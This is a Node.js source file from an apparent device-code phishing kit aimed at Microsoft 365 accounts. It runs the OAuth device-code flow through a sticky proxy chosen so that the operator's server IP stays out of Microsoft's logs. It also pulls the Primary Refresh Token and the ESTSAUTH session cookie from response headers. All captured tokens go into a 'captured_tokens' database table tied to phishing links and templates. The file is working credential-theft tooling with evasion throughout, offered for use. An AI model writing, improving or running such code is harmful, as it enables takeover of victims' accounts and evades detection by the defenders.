/**
 * devicecode.js
 *
 * Backend device code flow with proxy support and PRT extraction.
 *
 * Why this exists:
 * - All outbound calls go through microsoftclient (proxied), so the VPS IP
 *   never appears in Microsoft's logs.
 * - The device_code request and every subsequent token poll MUST use the same
 *   proxy — Microsoft binds the device_code to the IP that requested it. A
 *   random proxy per call would silently break the token exchange.
 * - The PRT is returned in the Set-Cookie header of the token response as
 *   `x-ms-RefreshTokenCredential`. The old code read only `response.data`
 *   and threw those headers away, so PRTs were never captured.
 */

const db = require('../database/connection');
const { encrypt } = require('../utils/encrypt');
const config = require('../config/env');
const ms = require('./microsoftclient');

const TENANT = config.AZURE_TENANT || 'common';
const CLIENT_ID = config.AZURE_CLIENT_ID;

/**
 * Request a device code from Microsoft.
 *
 * Claims a proxy and returns it alongside the device code data. The caller
 * MUST pass this proxy to pollForTokens — switching proxies mid-flow breaks
 * the exchange because Microsoft binds the code to the requesting IP.
 *
 * @returns {object} device code data + the claimed proxy
 */
async function requestDeviceCode() {
    const { proxy, response } = await ms.post(
        `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/devicecode`,
        new URLSearchParams({
            client_id: CLIENT_ID,
            scope: 'offline_access openid profile https://graph.microsoft.com/.default',
        }),
        {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            timeout: 15000,
            stickyProxy: true,
        }
    );

    return {
        device_code: response.data.device_code,
        user_code: response.data.user_code,
        verification_uri: response.data.verification_uri,
        expires_in: response.data.expires_in,
        interval: response.data.interval || 5,
        message: response.data.message,
        proxy,
    };
}

/**
 * Poll for tokens, extracting the PRT from Set-Cookie headers.
 *
 * @param {string} deviceCode
 * @param {number} linkId
 * @param {number} userId
 * @param {number} initialInterval
 * @param {object} proxy  - the SAME proxy returned by requestDeviceCode
 * @returns {object} { success, email, access_token, refresh_token, prt,
 *                     session_key_jwe, device_tenant_id, cookies, proxy }
 */
async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy) {
    const maxAttempts = 60;
    let attempts = 0;
    let interval = initialInterval || 5;

    while (attempts < maxAttempts) {
        attempts++;
        await new Promise(resolve => setTimeout(resolve, interval * 1000));

        let response;
        try {
            response = await ms.post(
                `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`,
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: CLIENT_ID,
                    device_code: deviceCode,
                }),
                {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    timeout: 15000,
                    proxy,
                }
            );
        } catch (err) {
            const errorCode = err.response?.data?.error || '';

            if (errorCode === 'authorization_pending') continue;
            if (errorCode === 'slow_down') { interval += 5; continue; }
            if (errorCode === 'authorization_declined') {
                return { success: false, error: 'User declined authorization', proxy };
            }
            if (errorCode === 'expired_token') {
                return { success: false, error: 'Code expired', proxy };
            }
            if (attempts >= maxAttempts) {
                return { success: false, error: 'Timeout waiting for user', proxy };
            }
            continue;
        }

        // Tokens received — extract cookies and persist
        const tokenData = response.data;
        const setCookieHeaders = response.headers['set-cookie'] || [];
        const parsedCookies = ms.parseSetCookieCookies(setCookieHeaders);

        const { access_token, refresh_token, id_token } = tokenData;

        let email = null;
        if (id_token) {
            try {
                const payload = JSON.parse(Buffer.from(id_token.split('.')[1], 'base64').toString());
                email = payload.email || payload.upn || payload.preferred_username || null;
            } catch (e) { /* ignore decode errors */ }
        }

        // Extract PRT from Set-Cookie headers.
        // x-ms-RefreshTokenCredential is the raw PRT — exactly what silent
        // consent expects as the x-ms-RefreshTokenCredential header value.
        // ESTSAUTH carries the session_key JWE.
        const prt = parsedCookies['x-ms-RefreshTokenCredential'] || null;
        const sessionKeyJwe = parsedCookies['ESTSAUTH'] || null;
        const deviceTenantId = parsedCookies['X-Device-Tenant-Id'] || null;

        // Try to parse the id_token's client_info claim for device_tenant_id
        let deviceTenantIdClaim = deviceTenantId;
        if (id_token && !deviceTenantIdClaim) {
            try {
                const payload = JSON.parse(Buffer.from(id_token.split('.')[1], 'base64').toString());
                if (payload.client_info) {
                    const info = JSON.parse(Buffer.from(payload.client_info, 'base64').toString());
                    deviceTenantIdClaim = info.did || null;
                }
            } catch (e) { /* ignore */ }
        }

        // Persist all captured data
        const clientIdUsed = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
        const tenant = config.AZURE_TENANT || 'common';

        await db.query(
            `INSERT INTO captured_tokens
             (user_id, link_id, email, token_type, access_token_encrypted,
              refresh_token_encrypted, id_token_encrypted,
              prt, session_key_jwe, device_tenant_id,
              ip_address, user_agent, expiration, tenant, template_type, client_id,
              account_type)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?, ?)`,
            [
                userId, linkId, email, 'token',
                access_token ? encrypt(access_token) : null,
                refresh_token ? encrypt(refresh_token) : null,
                id_token ? encrypt(id_token) : null,
                prt ? encrypt(prt) : null,
                sessionKeyJwe ? encrypt(sessionKeyJwe) : null,
                deviceTenantIdClaim,
                '0.0.0.0',
                'Device Code Flow',
                tenant, 'office', clientIdUsed,
                tenant === 'common' ? 'unknown' : 'work_school',
            ]
        );

        return {
            success: true,
            email,
            access_token,
            refresh_token,
            id_token,
            prt,
            session_key_jwe: sessionKeyJwe,
            device_tenant_id: deviceTenantIdClaim,
            cookies: parsedCookies,
            proxy,
        };
    }

    return { success: false, error: 'Timeout', proxy };
}

module.exports = { requestDeviceCode, pollForTokens };
